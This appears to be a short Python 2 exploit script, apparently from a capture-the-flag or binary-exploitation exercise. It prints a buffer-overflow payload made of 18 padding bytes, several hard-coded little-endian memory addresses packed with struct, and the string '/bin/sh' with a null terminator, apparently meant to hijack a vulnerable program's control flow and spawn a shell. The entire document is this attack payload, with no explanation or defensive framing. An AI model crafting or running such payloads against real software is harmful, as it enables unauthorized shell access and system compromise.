from struct import pack
print '\x60'*18+pack("<I",0xbffedf88)+ pack("<I",0x0804a030) +pack("<I",0x08048f5e)+pack("<I",0xbffedf78)+'/bin/sh'+'\x00'
